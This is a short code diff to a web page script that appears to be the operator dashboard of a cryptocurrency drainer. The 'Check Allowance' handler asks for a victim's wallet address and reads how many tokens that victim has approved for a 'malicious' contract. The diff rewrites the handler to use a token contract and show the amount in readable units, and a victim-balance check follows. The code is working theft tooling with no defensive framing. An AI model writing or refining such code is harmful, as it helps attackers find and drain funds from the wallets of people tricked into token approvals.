@@ -364,18 +364,19 @@ document.getElementById("checkAllowanceBtn").addEventListener("click", async () 
     const victimAddress = prompt("Enter victim's wallet address:");
     if (victimAddress) {
         try {
-            const allowance = await contract.methods.allowance(victimAddress, maliciousContractAddress).call();
-            if (allowance > 0) {
-                alert(`Allowance: ${allowance} tokens granted.`);
-            } else {
-                alert("No allowance granted.");
-            }
+            // Retrieve the allowance in Wei
+            const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
+            // Convert to token units for human readability
+            const readableAllowance = web3.utils.fromWei(allowance, 'ether');
+            alert(`Allowance: ${readableAllowance} tokens granted.`);
         } catch (error) {
             alert("Error while checking allowance.");
-            console.error(error);
+            console.error("Allowance Error:", error);
         }
     }
 });
+
+
 
 // Check Victim's Balance
 document.getElementById("checkBalanceBtn").addEventListener("click", async () => {
